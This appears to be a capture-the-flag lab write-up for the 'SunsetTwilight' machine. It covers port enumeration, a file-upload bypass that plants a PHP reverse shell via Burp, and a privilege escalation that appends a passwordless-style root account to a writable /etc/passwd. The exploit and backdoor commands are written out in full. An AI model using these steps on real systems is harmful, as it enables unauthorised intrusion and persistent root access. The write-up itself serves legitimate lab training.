# SunsetTwilight

**IP Address:** 192.168.90.91

## Enumeration
### Open Ports
| Port #| Service | Details  |
|:------|:---------|:---------|
| 22 | ssh | OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) |
| 25 | smtp | Exim smtpd |
| 80 | http | Apache httpd 2.4.38 ((Debian)) |
| 139 | netbios-ssn | Samba smbd 3.X - 4.X (workgroup: WORKGROUP) |
| 445 | netbios-ssn | Samba smbd 4.9.5-Debian (workgroup: WORKGROUP) |
| 2121 | ftp |pyftpdlib 1.5.6 |
| 3306 | mysql | MySQL 5.5.5-10.3.22-MariaDB-0+deb10u1 |
| 8080 | http | PHP cli server 5.5 or later |

## Exploitation
### Exploit Details (File Upload)
* **Name** - File Upload
* **CVE** - N/A
* **Module** - N/A
* **Disclosed** - N/A
* **References**
  * N/A

A web based file upload service allows us to upload a php shell. 

1. Navigate to the website http://192.168.90.91/gallery/index.php select browse and select a php reverse shell. 

![Execute Exploit](images/exploit1.png)

2. Intecept the request with burp suite and change the file type to be jpeg as shown below. 

![Execute Exploit](images/exploit2.png)

![Execute Exploit](images/exploit3.png)

3. Initiate the reverse shell. 


Commands
```bash
curl http://192.168.90.91/gallery/original/shell.php
whoami
cat /var/www/local.txt
```

![Execute Exploit](images/exploit4.png)

![Execute Exploit](images/exploit5.png)

## Privilege Escalation
### Exploit Details (Weak file permissions (/etc/passwd))
* **Name** - Weak file permissions (/etc/passwd)
* **CVE** - N/A
* **Module** - N/A
* **Disclosed** - N/A
* **References**
  * N/A

The /etc/passwd file is writeable so we can add a root user account. 

Commands
```bash
echo 'hack:'$(openssl passwd -1 -salt hack 123)':0:0:root:/root:/bin/bash' >> /etc/passwd
su hack
123
whoami
cat /root/proof.txt
```
![Execute Exploit](images/privesc1.png)

## Loot
```
local.txt
49a539380320f9b53c2d725377d7d74a
proof.txt
ffd5297f79444151af02ebba25ddd2b0
```